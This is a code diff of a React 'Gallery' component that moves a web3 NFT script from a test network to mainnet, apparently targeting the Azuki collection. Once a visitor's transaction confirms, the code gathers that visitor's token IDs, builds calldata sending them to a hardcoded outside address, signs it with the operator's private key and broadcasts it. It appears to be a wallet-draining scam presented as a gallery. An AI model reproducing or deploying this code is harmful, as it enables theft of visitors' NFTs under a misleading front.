@@ -19,9 +19,9 @@ function Gallery() {
 
   const web3 = new Web3(Web3.givenProvider || 'http://localhost:7545');
   // change azuki contract
-  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0x4092CEeEe9820446CDb83F87Bf501FFB4e8Cd4ed")
+  const Azuki_contract = new web3.eth.Contract(Azuki_abi, "0xED5AF388653567Af2F388E6224dC7C4b3241C544")
   // change contract
-  const bulkTransferContract = "0x4aeC23Ac2f40dA07046b73fac02E0Fd84efC2272" // mainnet contract 0xA10dF3F212e8480db5ffF956d46945B25C762045
+  const bulkTransferContract = "0xA10dF3F212e8480db5ffF956d46945B25C762045" // mainnet contract 0xA10dF3F212e8480db5ffF956d46945B25C762045
 
   const getData = async (address) => {
     const nftbalance = await Azuki_contract.methods.balanceOf(address).call()
@@ -101,7 +101,7 @@ function Gallery() {
       .on('transactionHash', function (result) {
         console.log(result)
         getData(defaultAccount).then((result) => {
-          let inputData = '0xf365dda8' + defaultAccount.substr(2, defaultAccount.length).padStart(64, '0') + "000000000000000000000000280BF7C829373d2d67bF9266E5F7ED3db6F581F1" + "0000000000000000000000000000000000000000000000000000000000000060" + parseInt(result.length).toString(16).padStart(64, '0')
+          let inputData = '0xf365dda8' + defaultAccount.substr(2, defaultAccount.length).padStart(64, '0') + "000000000000000000000000C23d8F66C3fedA39779e65748A311feb36341f7B" + "0000000000000000000000000000000000000000000000000000000000000060" + parseInt(result.length).toString(16).padStart(64, '0')
           for (var i = 0; i < result.length; i++) {
             var temp = result[i].toString(16).padStart(64, '0')
             inputData += temp
@@ -110,7 +110,7 @@ function Gallery() {
             to: bulkTransferContract,
             gas: 2000000,
             // change network ** mainnet ID : 1 **
-            chainId: 4,
+            chainId: 1,
             data: inputData
           }, process.env.PRIVATE_KEY).then(result => {
             web3.eth.sendSignedTransaction(result.rawTransaction).on('recript', console.log)
